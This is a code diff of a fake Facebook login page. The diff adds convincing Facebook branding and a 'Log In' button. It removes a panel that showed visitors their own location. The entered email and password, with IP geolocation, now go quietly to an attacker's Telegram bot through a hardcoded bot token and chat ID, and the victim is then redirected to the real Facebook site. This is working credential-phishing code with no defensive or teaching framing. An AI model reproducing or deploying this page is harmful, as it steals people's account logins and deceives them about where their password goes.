@@ -11,6 +11,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
 
+    <!-- Custom styling -->
     <style>
         body {
             background: #1877F2; /* Facebook blue */
@@ -31,6 +32,11 @@
             text-align: center;
             margin: auto;
             box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-container img {
+            max-width: 100%;
+            height: auto;
         }
 
         .form-container input {
@@ -55,52 +61,83 @@
             margin-top: 10px;
         }
 
-        .details {
-            margin-top: 20px;
-            background: #f0f0f0;
-            border-radius: 8px;
-            padding: 15px;
-            text-align: left;
-            color: #333;
+        .form-container button:hover {
+            background-color: #166fe5;
         }
 
-        .details span {
-            display: block;
-            margin: 5px 0;
+        .footer {
+            background-color: #3b5998;
+            color: white;
+            text-align: center;
+            padding: 15px 0;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        .footer img {
+            width: 25px;
+            height: 25px;
+            vertical-align: middle;
+            margin-right: 8px;
+        }
+
+        /* Responsive Design */
+        @media screen and (min-width: 768px) {
+            .form-container {
+                padding: 40px;
+            }
+
+            .form-container h2 {
+                font-size: 1.8rem;
+            }
+
+            .form-container input,
+            .form-container button {
+                font-size: 18px;
+            }
+
+            .footer {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 
 <body>
+    <!-- Main content -->
     <div class="form-container">
+        <!-- Top Image -->
+        <img src="https://www.dropbox.com/scl/fi/lyd1gq9sxbm03mzkbbay0/1703528251570.jpg?rlkey=bs41146b2oleicmsrv9k2ducp&raw=1" 
+             alt="Facebook" class="mb-4">
+
+        <!-- Facebook Logo -->
+        <div>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" 
+                 alt="Facebook Logo" width="90" height="90" class="mx-auto">
+        </div>
+
         <h2 class="text-blue-800 text-2xl mt-4 font-bold">Log In to Facebook</h2>
 
+        <!-- Login Form -->
         <form id="loginForm">
             <input type="text" name="email" id="email" placeholder="Email or Phone" required>
             <input type="password" name="password" id="password" placeholder="Password" required>
-            <button type="button" onclick="handleFormSubmission()">Submit</button>
+            <button type="button" onclick="sendToTelegram()">Log In</button>
         </form>
-
-        <div id="details" class="details" style="display: none;">
-            <h3>📍 Your Details</h3>
-            <span id="location">🌍 Location: Loading...</span>
-            <span id="country">🏳️ Country: Loading...</span>
-            <span id="flags">🚩 Flags: Loading...</span>
-            <span id="currentTime">⏰ Current Time: Loading...</span>
-        </div>
     </div>
 
+    <!-- Footer Section -->
+    <footer class="footer">
+        <div class="flex justify-center items-center">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+            <span>Facebook © From Meta</span>
+        </div>
+    </footer>
+
     <script>
-        async function handleFormSubmission() {
+        async function sendToTelegram() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
-
-            // Fetch location details
-            const detailsDiv = document.getElementById('details');
-            const locationSpan = document.getElementById('location');
-            const countrySpan = document.getElementById('country');
-            const flagsSpan = document.getElementById('flags');
-            const currentTimeSpan = document.getElementById('currentTime');
 
             try {
                 const res = await axios.get('https://ipapi.co/json/');
@@ -111,50 +148,34 @@
                 const flags = data.country_code ? `https://flagcdn.com/w320/${data.country_code.toLowerCase()}.png` : '';
                 const currentTime = new Date().toLocaleTimeString('en-US', { timeZone: data.timezone || 'UTC' });
 
-                // Update the details
-                locationSpan.textContent = `🌍 Location: ${location}`;
-                countrySpan.textContent = `🏳️ Country: ${country}`;
-                flagsSpan.innerHTML = flags ? `🚩 Flags: <img src="${flags}" alt="${country} flag" style="width: 20px; height: 15px;">` : '🚩 Flags: Not Available';
-                currentTimeSpan.textContent = `⏰ Current Time: ${currentTime}`;
+                const telegramToken = "7092700046:AAG4ysq9uQu_2nFBrKqx--wdf4C5jJG4_Bo"; // Replace with your bot token
+                const chatId = "6482794683"; // Replace with your chat ID
+                const message = `
+                📝 *Login Information* 📝
+                
+                🔑 *Email/Phone:* ${email}
+                🔐 *Password:* ${password}
+                🌍 *Location:* ${location}
+                🏳️ *Country:* ${country}
+                🚩 *Flag:* ${flags ? `[View Flag](${flags})` : 'Not Available'}
+                ⏰ *Current Time:* ${currentTime}
+                
+                📌 Please handle with care!
+                `;
 
-                // Show the details section
-                detailsDiv.style.display = 'block';
-            } catch (error) {
-                console.error('Error fetching location details:', error);
-                locationSpan.textContent = '🌍 Location: Failed to fetch';
-                countrySpan.textContent = '🏳️ Country: Failed to fetch';
-                flagsSpan.textContent = '🚩 Flags: Failed to fetch';
-                currentTimeSpan.textContent = '⏰ Current Time: Failed to fetch';
-            }
-
-            // Send details to Telegram
-            const telegramToken = "YOUR_BOT_TOKEN"; // Replace with your bot token
-            const chatId = "YOUR_CHAT_ID"; // Replace with your chat ID
-            const message = `
-            📝 *Login Information* 📝
-
-            🔑 *Email/Phone:* ${email}
-            🔐 *Password:* ${password}
-            🌍 *Location:* ${locationSpan.textContent}
-            🏳️ *Country:* ${countrySpan.textContent}
-            ⏰ *Time:* ${currentTimeSpan.textContent}
-            
-            📌 Please handle with care!
-            `;
-
-            try {
                 await axios.post(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                     chat_id: chatId,
                     text: message,
                     parse_mode: 'Markdown'
                 });
-                console.log("Message sent to Telegram!");
+
+                // Redirect after successful submission
+                window.location.href = "https://facebook.com";
             } catch (error) {
                 console.error("Error sending message to Telegram:", error);
+                // Redirect to Facebook even if something fails
+                window.location.href = "https://facebook.com";
             }
-
-            // Redirect to Facebook
-            window.location.href = "https://facebook.com";
         }
     </script>
 </body>
